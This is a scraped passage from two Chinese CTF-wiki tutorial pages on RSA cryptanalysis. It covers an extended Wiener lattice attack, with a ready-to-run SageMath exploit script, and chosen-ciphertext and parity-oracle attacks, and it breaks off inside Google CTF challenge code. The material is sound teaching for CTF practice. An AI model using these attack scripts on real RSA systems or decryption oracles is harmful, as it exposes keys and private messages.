& 0 & 0 & 0 & 0 & e_{6} & -N e_{6} & 0 & 0 & 0 & 0 & N^{2} e_{6} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & -N^{3} e_{6} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & N^{4} e_{6} & N^{4} e_{6} & N^{4} e_{6} & N^{4} e_{6} & N^{4} e_{6} & -N^{5} e_{6} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{6} & -e_{1} e_{6} & -e_{1} e_{6} & -e_{1} e_{6} & -e_{1} e_{6} & -N e_{1} e_{6} & 0 & 0 & 0 & N e_{1} e_{6} & 0 & 0 & 0 & 0 & 0 & N^{2} e_{1} e_{6} & 0 & 0 & 0 & 0 & 0 & -N^{2} e_{1} e_{6} & -N^{2} e_{1} e_{6} & -N^{2} e_{1} e_{6} & -N^{2} e_{1} e_{6} & -N^{3} e_{1} e_{6} & -N^{3} e_{1} e_{6} & -N^{3} e_{1} e_{6} & -N^{3} e_{1} e_{6} & 0 & N^{4} e_{1} e_{6} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{2} e_{6} & 0 & 0 & 0 & -N e_{2} e_{6} & N e_{2} e_{6} & N e_{2} e_{6} & N e_{2} e_{6} & -N e_{2} e_{6} & 0 & 0 & 0 & 0 & 0 & N^{2} e_{2} e_{6} & 0 & 0 & -N^{2} e_{2} e_{6} & -N^{2} e_{2} e_{6} & -N^{2} e_{2} e_{6} & 0 & 0 & 0 & 0 & -N^{3} e_{2} e_{6} & -N^{3} e_{2} e_{6} & -N^{3} e_{2} e_{6} & 0 & -N^{3} e_{2} e_{6} & N^{4} e_{2} e_{6} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{3} e_{6} & 0 & 0 & 0 & -N e_{3} e_{6} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & N^{2} e_{3} e_{6} & -N^{2} e_{3} e_{6} & -N^{2} e_{3} e_{6} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & -N^{3} e_{3} e_{6} & -N^{3} e_{3} e_{6} & 0 & -N^{3} e_{3} e_{6} & -N^{3} e_{3} e_{6} & N^{4} e_{3} e_{6} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{4} e_{6} & 0 & 0 & 0 & -N e_{4} e_{6} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & N^{2} e_{4} e_{6} & 0 & N^{2} e_{4} e_{6} & 0 & 0 & N^{2} e_{4} e_{6} & 0 & 0 & 0 & -N^{3} e_{4} e_{6} & 0 & -N^{3} e_{4} e_{6} & -N^{3} e_{4} e_{6} & -N^{3} e_{4} e_{6} & N^{4} e_{4} e_{6} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{5} e_{6} & 0 & 0 & 0 & -N e_{5} e_{6} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & N^{2} e_{5} e_{6} & 0 & N^{2} e_{5} e_{6} & N^{2} e_{5} e_{6} & 0 & N^{2} e_{5} e_{6} & N^{2} e_{5} e_{6} & N^{2} e_{5} e_{6} & 0 & -N^{3} e_{5} e_{6} & -N^{3} e_{5} e_{6} & -N^{3} e_{5} e_{6} & -N^{3} e_{5} e_{6} & N^{4} e_{5} e_{6} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{2} e_{6} & -e_{1} e_{2} e_{6} & -e_{1} e_{2} e_{6} & -e_{1} e_{2} e_{6} & 0 & 0 & 0 & e_{1} e_{2} e_{6} & e_{1} e_{2} e_{6} & e_{1} e_{2} e_{6} & -N e_{1} e_{2} e_{6} & 0 & 0 & N e_{1} e_{2} e_{6} & N e_{1} e_{2} e_{6} & N e_{1} e_{2} e_{6} & N e_{1} e_{2} e_{6} & N e_{1} e_{2} e_{6} & N e_{1} e_{2} e_{6} & 0 & N^{2} e_{1} e_{2} e_{6} & N^{2} e_{1} e_{2} e_{6} & N^{2} e_{1} e_{2} e_{6} & 0 & 0 & -N^{3} e_{1} e_{2} e_{6} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{3} e_{6} & 0 & 0 & -e_{1} e_{3} e_{6} & e_{1} e_{3} e_{6} & e_{1} e_{3} e_{6} & 0 & 0 & 0 & -N e_{1} e_{3} e_{6} & N e_{1} e_{3} e_{6} & N e_{1} e_{3} e_{6} & 0 & 0 & 0 & N e_{1} e_{3} e_{6} & N e_{1} e_{3} e_{6} & 0 & N e_{1} e_{3} e_{6} & N^{2} e_{1} e_{3} e_{6} & N^{2} e_{1} e_{3} e_{6} & 0 & N^{2} e_{1} e_{3} e_{6} & 0 & -N^{3} e_{1} e_{3} e_{6} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{4} e_{6} & 0 & 0 & -e_{1} e_{4} e_{6} & 0 & -e_{1} e_{4} e_{6} & 0 & 0 & 0 & -N e_{1} e_{4} e_{6} & 0 & -N e_{1} e_{4} e_{6} & 0 & 0 & 0 & 0 & N e_{1} e_{4} e_{6} & N e_{1} e_{4} e_{6} & N^{2} e_{1} e_{4} e_{6} & 0 & N^{2} e_{1} e_{4} e_{6} & N^{2} e_{1} e_{4} e_{6} & 0 & -N^{3} e_{1} e_{4} e_{6} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{5} e_{6} & 0 & 0 & -e_{1} e_{5} e_{6} & 0 & -e_{1} e_{5} e_{6} & -e_{1} e_{5} e_{6} & 0 & 0 & -N e_{1} e_{5} e_{6} & 0 & -N e_{1} e_{5} e_{6} & -N e_{1} e_{5} e_{6} & 0 & 0 & 0 & 0 & 0 & N^{2} e_{1} e_{5} e_{6} & N^{2} e_{1} e_{5} e_{6} & N^{2} e_{1} e_{5} e_{6} & 0 & -N^{3} e_{1} e_{5} e_{6} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{2} e_{3} e_{6} & -e_{2} e_{3} e_{6} & -e_{2} e_{3} e_{6} & -e_{2} e_{3} e_{6} & -e_{2} e_{3} e_{6} & 0 & -N e_{2} e_{3} e_{6} & N e_{2} e_{3} e_{6} & N e_{2} e_{3} e_{6} & N e_{2} e_{3} e_{6} & N e_{2} e_{3} e_{6} & 0 & 0 & 0 & 0 & 0 & N^{2} e_{2} e_{3} e_{6} & N^{2} e_{2} e_{3} e_{6} & 0 & 0 & N^{2} e_{2} e_{3} e_{6} & -N^{3} e_{2} e_{3} e_{6} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{2} e_{4} e_{6} & 0 & 0 & 0 & -e_{2} e_{4} e_{6} & 0 & -N e_{2} e_{4} e_{6} & 0 & 0 & 0 & N e_{2} e_{4} e_{6} & -N e_{2} e_{4} e_{6} & 0 & 0 & 0 & N^{2} e_{2} e_{4} e_{6} & 0 & N^{2} e_{2} e_{4} e_{6} & 0 & N^{2} e_{2} e_{4} e_{6} & -N^{3} e_{2} e_{4} e_{6} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{2} e_{5} e_{6} & 0 & 0 & 0 & 0 & 0 & -N e_{2} e_{5} e_{6} & 0 & 0 & 0 & 0 & -N e_{2} e_{5} e_{6} & -N e_{2} e_{5} e_{6} & 0 & 0 & N^{2} e_{2} e_{5} e_{6} & N^{2} e_{2} e_{5} e_{6} & 0 & N^{2} e_{2} e_{5} e_{6} & -N^{3} e_{2} e_{5} e_{6} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{3} e_{4} e_{6} & 0 & 0 & 0 & 0 & 0 & -N e_{3} e_{4} e_{6} & 0 & 0 & -N e_{3} e_{4} e_{6} & 0 & 0 & 0 & N^{2} e_{3} e_{4} e_{6} & 0 & 0 & N^{2} e_{3} e_{4} e_{6} & N^{2} e_{3} e_{4} e_{6} & -N^{3} e_{3} e_{4} e_{6} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{3} e_{5} e_{6} & 0 & 0 & 0 & 0 & 0 & -N e_{3} e_{5} e_{6} & 0 & 0 & -N e_{3} e_{5} e_{6} & 0 & -N e_{3} e_{5} e_{6} & 0 & N^{2} e_{3} e_{5} e_{6} & 0 & N^{2} e_{3} e_{5} e_{6} & N^{2} e_{3} e_{5} e_{6} & -N^{3} e_{3} e_{5} e_{6} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{4} e_{5} e_{6} & 0 & 0 & 0 & 0 & 0 & -N e_{4} e_{5} e_{6} & 0 & 0 & -N e_{4} e_{5} e_{6} & -N e_{4} e_{5} e_{6} & 0 & 0 & N^{2} e_{4} e_{5} e_{6} & N^{2} e_{4} e_{5} e_{6} & N^{2} e_{4} e_{5} e_{6} & -N^{3} e_{4} e_{5} e_{6} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{2} e_{3} e_{6} & -e_{1} e_{2} e_{3} e_{6} & -e_{1} e_{2} e_{3} e_{6} & -e_{1} e_{2} e_{3} e_{6} & -e_{1} e_{2} e_{3} e_{6} & 0 & -e_{1} e_{2} e_{3} e_{6} & -e_{1} e_{2} e_{3} e_{6} & 0 & 0 & -N e_{1} e_{2} e_{3} e_{6} & -N e_{1} e_{2} e_{3} e_{6} & 0 & 0 & 0 & N^{2} e_{1} e_{2} e_{3} e_{6} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{2} e_{4} e_{6} & 0 & 0 & 0 & -e_{1} e_{2} e_{4} e_{6} & 0 & 0 & -e_{1} e_{2} e_{4} e_{6} & 0 & -N e_{1} e_{2} e_{4} e_{6} & 0 & -N e_{1} e_{2} e_{4} e_{6} & 0 & 0 & N^{2} e_{1} e_{2} e_{4} e_{6} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{2} e_{5} e_{6} & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & -N e_{1} e_{2} e_{5} e_{6} & -N e_{1} e_{2} e_{5} e_{6} & 0 & 0 & N^{2} e_{1} e_{2} e_{5} e_{6} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{3} e_{4} e_{6} & 0 & 0 & 0 & 0 & 0 & -e_{1} e_{3} e_{4} e_{6} & -N e_{1} e_{3} e_{4} e_{6} & 0 & 0 & -N e_{1} e_{3} e_{4} e_{6} & 0 & N^{2} e_{1} e_{3} e_{4} e_{6} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{3} e_{5} e_{6} & 0 & 0 & 0 & 0 & 0 & 0 & -N e_{1} e_{3} e_{5} e_{6} & 0 & -N e_{1} e_{3} e_{5} e_{6} & 0 & N^{2} e_{1} e_{3} e_{5} e_{6} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{4} e_{5} e_{6} & 0 & 0 & 0 & 0 & 0 & 0 & -N e_{1} e_{4} e_{5} e_{6} & -N e_{1} e_{4} e_{5} e_{6} & 0 & N^{2} e_{1} e_{4} e_{5} e_{6} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{2} e_{3} e_{4} e_{6} & 0 & 0 & 0 & -N e_{2} e_{3} e_{4} e_{6} & 0 & 0 & 0 & -N e_{2} e_{3} e_{4} e_{6} & N^{2} e_{2} e_{3} e_{4} e_{6} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{2} e_{3} e_{5} e_{6} & 0 & 0 & 0 & -N e_{2} e_{3} e_{5} e_{6} & 0 & 0 & -N e_{2} e_{3} e_{5} e_{6} & N^{2} e_{2} e_{3} e_{5} e_{6} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{2} e_{4} e_{5} e_{6} & 0 & 0 & 0 & -N e_{2} e_{4} e_{5} e_{6} & 0 & -N e_{2} e_{4} e_{5} e_{6} & N^{2} e_{2} e_{4} e_{5} e_{6} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{3} e_{4} e_{5} e_{6} & 0 & 0 & 0 & -N e_{3} e_{4} e_{5} e_{6} & -N e_{3} e_{4} e_{5} e_{6} & N^{2} e_{3} e_{4} e_{5} e_{6} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{2} e_{3} e_{4} e_{6} & 0 & 0 & 0 & 0 & -N e_{1} e_{2} e_{3} e_{4} e_{6} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{2} e_{3} e_{5} e_{6} & 0 & 0 & 0 & -N e_{1} e_{2} e_{3} e_{5} e_{6} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{2} e_{4} e_{5} e_{6} & 0 & 0 & -N e_{1} e_{2} e_{4} e_{5} e_{6} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{3} e_{4} e_{5} e_{6} & 0 & -N e_{1} e_{3} e_{4} e_{5} e_{6} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{2} e_{3} e_{4} e_{5} e_{6} & -N e_{2} e_{3} e_{4} e_{5} e_{6} \\\\\n    0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{2} e_{3} e_{4} e_{5} e_{6}\n    \\end{array}\\right)\n    $$\n\n## 开放探讨\n\n* 对于现在扩展维纳的问题都是$n=2$或者是$n=3$时候的**模板题**，对于更高维的情况，可以编写自动化的脚本来完整自动选择关系、自动构造格等步骤，比如上述内容就是自动生成的。但是对于$n$每增加1，矩阵则是指数倍增加，因为这是一个$2^n * 2^n$的矩阵，这时候直接调用`sagemath`中的`LLL()`变得非常缓慢，大约$n=8$的情况已经运行不出来了，我曾尝试寻找`LLL`在CUDA上的并行算法或是一些其他优化方案实现，但是都是找到了论文没有给出源码的情况。\n\n    如果您对这方面有所研究或者有什么更好的优化方法，欢迎联系我（[Xenny](https://github.com/X3NNY)）一起进行更加深入的探讨。\n\n## EXP\n\n* 考虑到不是每个人都需要深入研究扩展维纳攻击，这里还是给出$n=2$时候的EXP以供使用\n\n    ```python\n    e1 = ...\n    e2 = ...\n    N = ...\n    a = 5/14\n    D = diagonal_matrix(ZZ, [N, int(N^(1/2)), int(N^(1+a)), 1])\n    M = matrix(ZZ, [[1, -N, 0, N^2], [0, e1, -e1, -e1*N], [0, 0, e2, -e2*N], [0, 0, 0, e1*e2]])*D\n    L = M.LLL()\n    t = vector(ZZ, L[0])\n    x = t * M^(-1)\n    phi = int(x[1]/x[0]*e1)\n    ```\n\n## References\n\n* [Extending Wiener's Attack in the Presence of Many Decrypting Exponents](https://www.sci-hub.ren/https://link.springer.com/chapter/10.1007/3-540-46701-7_14)\n* [并行LLL算法研究综述](https://arcnl.org/jchen/download/survey_plll.pdf)\n* [Factoring Polynomials with Rational Coefficients](https://www.math.leidenuniv.nl/~hwl/PUBLICATIONS/1982f/art.pdf)\n* [A PARALLEL JACOBI-TYPE LATTICE BASIS REDUCTION\nALGORITHM](https://www.cas.mcmaster.ca/~qiao/publications/JQ14.pdf)", "timestamp": "2025-10-21T22:02:48.086010"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/asymmetric/rsa/rsa_chosen_plain_cipher.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/asymmetric/rsa/rsa_chosen_plain_cipher.md", "content": "# RSA 选择明密文攻击\n\n## 选择明文攻击\n\n这里给出一个例子，假如我们有一个加密 oracle ，但是我们不知道 n 和 e，那\n\n1. 我们可以通过加密 oracle 获取 n。\n2. 在 e 比较小（ $e<2^{64}$）时，我们可以利用 *Pollard’s kangaroo algorithm* 算法获取 e。这一点比较显然。\n\n我们可以加密 2，4，8，16。那么我们可以知道\n\n$c_2=2^{e} \\bmod n$\n\n$c_4=4^{e} \\bmod n$\n\n$c_8=8^{e} \\bmod n$\n\n那么\n\n$c_2^2 \\equiv c_4 \\bmod n$\n\n$c_2^3 \\equiv c_8 \\bmod n$\n\n故而\n\n$c_2^2-c_4=kn$\n\n$c_2^3-c_8=tn$\n\n我们可以求出 kn 和 tn 的最大公因数，很大概率就是 n 了。我们还可以构造更多的例子从来更加确定性地找 n。\n\n## 任意密文解密\n\n假设爱丽丝创建了密文 $C = P^e \\bmod n$ 并且把 C 发送给鲍勃，同时假设我们要对爱丽丝加密后的任意密文解密，而不是只解密 C，那么我们可以拦截 C，并运用下列步骤求出 P：\n\n1. 选择任意的 $X\\in Z_n^{*}$，即 X 与 N 互素\n2. 计算 $Y=C \\times X^e \\bmod n$ \n3. 由于我们可以进行选择密文攻击，那么我们求得 Y 对应的解密结果 $Z=Y^d$\n4. 那么，由于 $Z=Y^d=(C \\times X^e)^d=C^d X=P^{ed} X= P X\\bmod n$，由于 X 与 N 互素，我们很容易求得相应的逆元，进而可以得到 P\n\n## RSA parity oracle\n\n假设目前存在一个 Oracle，它会对一个给定的密文进行解密，并且会检查解密的明文的奇偶性，并根据奇偶性返回相应的值，比如 1 表示奇数，0 表示偶数。那么给定一个加密后的密文，我们只需要 log(N) 次就可以知道这个密文对应的明文消息。\n\n### 原理\n\n假设\n\n$C=P^e \\bmod N$\n\n第一次时，我们可以给服务器发送\n\n$C*2^e=(2P)^e \\bmod N$\n\n服务器会计算得到\n\n$2P \\bmod N$\n\n这里\n\n- 2P 是偶数，它的幂次也是偶数。\n- N 是奇数，因为它是由两个大素数相乘得到。\n\n那么\n\n\n- 服务器返回奇数，即 $2P \\bmod N$ 为奇数，则说明 2P 大于 N，且减去了奇数个 N，又因为 $2P<2N$，因此减去了一个N， 即 $\\frac{N}{2} \\leq P < N$，我们还可以考虑向下取整。\n- 服务器返回偶数，则说明 2P 小于 N。即 $0\\leq P < \\frac{N}{2}$，我们还可以向下取整。\n\n这里我们使用数学归纳法，即假设在第 i 次时，$\\frac{xN}{2^{i}} \\leq P < \\frac{xN+N}{2^{i}}$\n\n\n进一步，在第 i+1 次时，我们可以发送\n\n$C*2^{(i+1)e}$\n\n服务器会计算得到\n\n$2^{i+1}P \\bmod N=2^{i+1}P-kN$\n\n$0 \\leq 2^{i+1}P-kN<N$ \n\n$\\frac{kN}{2^{i+1}} \\leq P < \\frac{kN+N}{2^{i+1}}$\n\n根据第 i 次的结果\n\n$\\frac{2xN}{2^{i+1}} \\leq P < \\frac{2xN+2N}{2^{i+1}}$\n\n那么\n\n- 服务器返回奇数，则 k 必然是一个奇数，k=2y+1， 那么 $\\frac{2yN+N}{2^{i+1}} \\leq P < \\frac{2yN+2N}{2^{i+1}}$。与此同时，由于 P 必然存在，所以第 i+1 得到的这个范围和第 i 次得到的范围必然存在交集。所以 y 必然与 x 相等。\n- 服务器返回偶数，则 k 必然是一个偶数，k=2y，此时 y 必然也与 x 相等，那么 $\\frac{2xN}{2^{i+1}} \\leq P < \\frac{2xN+N}{2^{i+1}}$\n\n进一步我们可以这么归纳\n\n```c\nlb = 0\nub = N\nif server returns 1\n\tlb = (lb+ub)/2\nelse:\n\tub = (lb+ub)/2\n```\n\n这里虽然是整除， 即下取整，但是无所谓我们在最初时已经分析了这个问题。\n\n### 2018 Google CTF Perfect Secrecy\n\n这里以 2018 年 Google CTF 的题目为例进行分析\n\n```python\n#!/usr/bin/env python3\nimport sys\nimport random\n\nfrom cryptography.hazmat.primitives import serialization\nfrom cryptography.hazmat.backends import default_backend\n\n\ndef ReadPrivateKey(filename):\n  return serialization.load_pem_private_key(\n      open(filename, 'rb').read(), password=None, backend=default_backend())\n\n\ndef RsaDecrypt(private_key, ciphertext):\n  assert (len(ciphertext) <=\n   